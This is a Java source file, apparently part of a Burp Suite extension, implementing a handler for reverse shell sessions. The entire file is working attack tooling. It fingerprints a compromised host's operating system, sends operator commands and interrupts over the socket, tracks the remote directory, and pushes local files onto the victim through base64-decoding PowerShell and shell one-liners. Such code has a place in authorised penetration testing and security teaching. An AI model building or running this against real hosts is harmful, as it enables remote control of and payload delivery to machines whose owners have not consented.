package burp.listener;

import burp.IBurpExtenderCallbacks;
import burp.ui.UITheme;

import javax.swing.*;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyledDocument;
import java.awt.*;
import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Duration;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.ExecutorService;

/**
 * Encapsulates an active or historical reverse shell connection session.
 */
public class ShellSession {

    public enum SessionShellType {
        UNKNOWN("Unknown"),
        UNIX("Linux / UNIX"),
        WINDOWS_CMD("Windows CMD"),
        WINDOWS_PS("PowerShell");

        private final String label;
        SessionShellType(String label) { this.label = label; }
        public String getLabel() { return label; }
    }

    private final int id;
    private final Socket socket;
    private final IBurpExtenderCallbacks callbacks;
    private final String remoteAddress;
    private final int remotePort;
    private final LocalDateTime connectedAt;
    private final String connectedTimeString;

    private volatile boolean active = true;
    private volatile SessionShellType shellType = SessionShellType.UNKNOWN;
    private volatile String currentRemotePath = "~";
    private volatile boolean isCapturingPath = false;
    private volatile String lastCommand = "";
    private volatile long bytesReceived = 0;

    private PrintWriter writer;
    private BufferedReader reader;
    private Thread readerThread;

    private final JTextPane displayPane;
    private final StyledDocument doc;
    private final Style styleNormal, styleInput, styleStatus, stylePath;
    private final List<String> commandHistory = new ArrayList<>();
    private int historyIndex = -1;

    private static final String PWD_MARKER_START = "___PWD_START___";
    private static final String PWD_MARKER_END = "___PWD_END___";

    public interface SessionEventListener {
        void onSessionOutput(ShellSession session, String text);
        void onSessionTerminated(ShellSession session);
        void onPathUpdated(ShellSession session, String newPath);
    }

    private SessionEventListener listener;

    public ShellSession(int id, Socket socket, SessionEventListener listener) throws IOException {
        this(id, socket, null, listener);
    }

    public ShellSession(int id, Socket socket, IBurpExtenderCallbacks callbacks, SessionEventListener listener) throws IOException {
        this.id = id;
        this.socket = socket;
        this.callbacks = callbacks;
        this.listener = listener;
        this.remoteAddress = socket.getInetAddress().getHostAddress();
        this.remotePort = socket.getPort();
        this.connectedAt = LocalDateTime.now();
        this.connectedTimeString = connectedAt.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));

        this.writer = new PrintWriter(socket.getOutputStream(), true);
        this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        this.displayPane = new JTextPane();
        this.displayPane.setEditable(false);
        this.displayPane.setFont(UITheme.FONT_CODE);
        this.displayPane.setBackground(UITheme.TERM_BG);
        this.displayPane.setForeground(UITheme.TERM_FG);
        this.displayPane.setCaretColor(Color.WHITE);
        this.displayPane.setMargin(new Insets(8, 8, 8, 8));

        this.doc = displayPane.getStyledDocument();
        this.styleNormal = displayPane.addStyle("Normal", null);
        StyleConstants.setForeground(styleNormal, UITheme.TERM_OUTPUT);

        this.styleInput = displayPane.addStyle("Input", styleNormal);
        StyleConstants.setForeground(styleInput, UITheme.TERM_PROMPT);
        StyleConstants.setBold(styleInput, true);

        this.styleStatus = displayPane.addStyle("Status", styleNormal);
        StyleConstants.setForeground(styleStatus, UITheme.TERM_STATUS);
        StyleConstants.setBold(styleStatus, true);

        this.stylePath = displayPane.addStyle("Path", styleNormal);
        StyleConstants.setForeground(stylePath, UITheme.TERM_PATH);
        StyleConstants.setBold(stylePath, true);

        appendOutput("[SESSION #" + id + " CONNECTED - " + remoteAddress + ":" + remotePort + " at " + connectedTimeString + "]\n\n", styleStatus);
    }

    public void startReading(ExecutorService executor) {
        // Send initial OS probe
        executor.submit(() -> {
            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
            if (writer != null) {
                writer.println("echo ___OS_PROBE___ $env:OS %OS%");
                writer.flush();
            }
        });

        readerThread = new Thread(() -> {
            try {
                String line;
                while (active && (line = reader.readLine()) != null) {
                    bytesReceived += line.length() + 1;
                    String cleanLine = line
                            .replaceAll("\u001B\\[[0-9;]*[mGKHJABCD]", "")
                            .replaceAll("\u001B\\[\\?[0-9]+[hl]", "")
                            .replaceAll("\r", "")
                            .trim();

                    if (cleanLine.contains("___OS_PROBE___")) {
                        if (cleanLine.startsWith("echo ") || cleanLine.contains("echo ___OS_PROBE___")) continue;
                        if (cleanLine.contains("Windows_NT")) {
                            shellType = cleanLine.contains("%OS%") ? SessionShellType.WINDOWS_PS : SessionShellType.WINDOWS_CMD;
                        } else {
                            shellType = SessionShellType.UNIX;
                        }

                        final String cwdCmd = (shellType == SessionShellType.WINDOWS_CMD)
                                ? "echo " + PWD_MARKER_START + " & cd & echo " + PWD_MARKER_END
                                : (shellType == SessionShellType.WINDOWS_PS)
                                ? "echo " + PWD_MARKER_START + "; (pwd).Path; echo " + PWD_MARKER_END
                                : "echo " + PWD_MARKER_START + "; pwd; echo " + PWD_MARKER_END;

                        executor.submit(() -> {
                            if (writer != null) {
                                writer.println(cwdCmd);
                                writer.flush();
                            }
                        });
                        continue;
                    }

                    if (cleanLine.equals(PWD_MARKER_START)) { isCapturingPath = true; continue; }
                    if (cleanLine.equals(PWD_MARKER_END)) {
                        isCapturingPath = false;
                        if (listener != null) listener.onPathUpdated(this, currentRemotePath);
                        continue;
                    }
                    if (isCapturingPath) {
                        currentRemotePath = cleanLine;
                        continue;
                    }

                    if (cleanLine.isEmpty() || cleanLine.contains("stty") || cleanLine.contains("export")) continue;
                    if (!lastCommand.isEmpty() && (cleanLine.equals(lastCommand) || cleanLine.endsWith(lastCommand))) continue;
                    if (cleanLine.matches("^[#$>\\s]+\\s+.*")) continue;

                    final String output = cleanLine;
                    appendOutput(output + "\n", styleNormal);
                    if (listener != null) listener.onSessionOutput(this, output);
                }
            } catch (IOException e) {
                if (active && callbacks != null) {
                    callbacks.printError("Session #" + id + " connection broken unexpectedly: " + e.getMessage());
                }
            } finally {
                active = false;
                appendOutput("\n[SESSION #" + id + " DISCONNECTED]\n\n", styleStatus);
                if (listener != null) listener.onSessionTerminated(this);
            }
        });
        readerThread.setDaemon(true);
        readerThread.start();
    }

    public void sendCommand(String cmd, ExecutorService executor) {
        if (!active || writer == null || writer.checkError()) return;
        commandHistory.add(cmd);
        historyIndex = -1;

        if (cmd.equalsIgnoreCase("clear") || cmd.equalsIgnoreCase("cls")) {
            displayPane.setText("");
            return;
        }

        appendOutput("\n[" + remoteAddress + "] [DIR: ", styleInput);
        appendOutput(currentRemotePath, stylePath);
        appendOutput("] $ " + cmd + "\n", styleInput);

        lastCommand = cmd;
        final String finalCmd = cmd;

        executor.submit(() -> {
            String fullCmd;
            if (shellType == SessionShellType.WINDOWS_CMD) {
                fullCmd = finalCmd + " & echo " + PWD_MARKER_START + " & cd & echo " + PWD_MARKER_END + "\n";
            } else if (shellType == SessionShellType.WINDOWS_PS) {
                fullCmd = finalCmd + "; echo " + PWD_MARKER_START + "; (pwd).Path; echo " + PWD_MARKER_END + "\n";
            } else {
                fullCmd = finalCmd + "; echo " + PWD_MARKER_START + "; pwd; echo " + PWD_MARKER_END + "\n";
            }
            writer.print(fullCmd);
            writer.flush();
        });
    }

    public void sendSignalCtrlC(ExecutorService executor) {
        if (!active || writer == null) return;
        executor.submit(() -> {
            writer.print("\u0003");
            writer.flush();
        });
        appendOutput("\n[SENT SIGINT (CTRL+C)]\n", styleStatus);
    }

    public void uploadFileChunked(File localFile, String remoteTargetPath, ExecutorService executor) {
        if (!active || writer == null || !localFile.exists()) return;

        executor.submit(() -> {
            try {
                byte[] fileBytes = Files.readAllBytes(localFile.toPath());
                String base64Content = Base64.getEncoder().encodeToString(fileBytes);
                appendOutput("\n[UPLOADING " + localFile.getName() + " (" + fileBytes.length + " bytes) -> " + remoteTargetPath + "...]\n", styleStatus);

                if (shellType == SessionShellType.WINDOWS_PS || shellType == SessionShellType.WINDOWS_CMD) {
                    // PowerShell Base64 decoding
                    String psCmd = "[System.IO.File]::WriteAllBytes('" + remoteTargetPath + "', [System.Convert]::FromBase64String('" + base64Content + "'))";
                    writer.println("powershell -c \"" + psCmd + "\"");
                } else {
                    // Linux echo base64 decode
                    writer.println("echo '" + base64Content + "' | base64 -d > '" + remoteTargetPath + "'");
                }
                writer.flush();
                appendOutput("[UPLOAD COMMAND DISPATCHED]\n", styleStatus);
            } catch (IOException e) {
                appendOutput("[UPLOAD ERROR: " + e.getMessage() + "]\n", styleStatus);
            }
        });
    }

    public void exportLogToMarkdown(File destinationFile) throws IOException {
        String logContent = displayPane.getText();
        StringBuilder md = new StringBuilder();
        md.append("# Reverse Shell Session Transcript - Session #").append(id).append("\n\n");
        md.append("- **Remote Host:** ").append(remoteAddress).append(":").append(remotePort).append("\n");
        md.append("- **Connected At:** ").append(connectedTimeString).append("\n");
        md.append("- **Detected OS:** ").append(shellType.getLabel()).append("\n");
        md.append("- **Total Bytes Exchanged:** ").append(bytesReceived).append(" Bytes\n\n");
        md.append("```text\n");
        md.append(logContent);
        md.append("\n```\n");

        try (FileOutputStream fos = new FileOutputStream(destinationFile)) {
            fos.write(md.toString().getBytes(StandardCharsets.UTF_8));
        }
    }

    public void appendOutput(String text, Style style) {
        SwingUtilities.invokeLater(() -> {
            try {
                doc.insertString(doc.getLength(), text, style);
                displayPane.setCaretPosition(doc.getLength());
            } catch (Exception ignored) {}
        });
    }

    public void close() {
        active = false;
        if (writer != null) {
            try { writer.close(); } catch (Exception ignored) {}
        }
        if (socket != null && !socket.isClosed()) {
            try { socket.close(); } catch (Exception ignored) {}
        }
        if (readerThread != null) {
            readerThread.interrupt();
        }
    }

    public String getUptime() {
        Duration duration = Duration.between(connectedAt, LocalDateTime.now());
        long seconds = duration.getSeconds();
        long hours = seconds / 3600;
        long minutes = (seconds % 3600) / 60;
        long secs = seconds % 60;
        if (hours > 0) {
            return String.format("%dh %dm %ds", hours, minutes, secs);
        }
        return String.format("%dm %ds", minutes, secs);
    }

    // Getters
    public int getId() { return id; }
    public String getRemoteAddress() { return remoteAddress; }
    public int getRemotePort() { return remotePort; }
    public String getConnectedTimeString() { return connectedTimeString; }
    public boolean isActive() { return active; }
    public SessionShellType getShellType() { return shellType; }
    public String getCurrentRemotePath() { return currentRemotePath; }
    public JTextPane getDisplayPane() { return displayPane; }
    public long getBytesReceived() { return bytesReceived; }
    public List<String> getCommandHistory() { return commandHistory; }

    @Override
    public String toString() {
        return "Session #" + id + " [" + remoteAddress + ":" + remotePort + "] (" + (active ? "Active" : "Closed") + ")";
    }
}
